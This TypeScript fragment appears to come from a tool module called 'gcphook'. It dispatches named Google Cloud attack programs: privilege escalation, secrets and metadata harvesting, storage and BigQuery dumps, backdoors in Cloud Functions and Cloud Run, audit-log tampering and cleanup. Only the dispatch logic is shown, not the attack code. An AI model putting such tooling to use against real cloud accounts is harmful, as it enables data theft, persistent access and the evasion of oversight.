    }

    const wrap =
      (fn: () => Promise<string>): (() => Promise<HookResult>) =>
      async () => ({ output: await fn(), findings: [] })

    const dispatch: Record<Program, () => Promise<HookResult>> = {
      gcp_enum: () => gcpEnum(params.args, params.timeout_seconds),
      gcp_privesc: wrap(() => gcpPrivesc(params.args, params.timeout_seconds)),
      gcs_dump: wrap(() => gcsDump(params.args, params.timeout_seconds)),
      metadata_harvest_gcp: wrap(() => metadataHarvestGcp()),
      secrets_dump_gcp: wrap(() => secretsDumpGcp(params.args, params.timeout_seconds)),
      cloudfunc_backdoor: wrap(() => cloudfuncBackdoor(params.args, params.timeout_seconds)),
      audit_log_tamper: wrap(() => auditLogTamper(params.args, params.timeout_seconds)),
      compute_snapshot: wrap(() => computeSnapshot(params.args, params.timeout_seconds)),
      bigquery_dump: () => bigqueryDump(params.args, params.timeout_seconds),
      gke_enum: () => gkeEnum(params.args, params.timeout_seconds),
      cloud_run_backdoor: () => cloudRunBackdoor(params.args, params.timeout_seconds),
      pubsub_sniff: () => pubsubSniff(params.args, params.timeout_seconds),
      cleanup_gcp: wrap(() => cleanupGcp(params.args, params.timeout_seconds)),
    }

    try {
      const result = await dispatch[params.program]()
      return {
        title: `gcphook: ${params.program}`,
        output: result.output,
        metadata: { program: params.program, findings: result.findings },
      }
    } catch (e) {
      return {
        title: `gcphook: ${params.program}`,
        output: `Error: ${e instanceof Error ? e.message : String(e)}`,
        metadata: { program: params.program, findings: [] },
      }
    }
  },
})
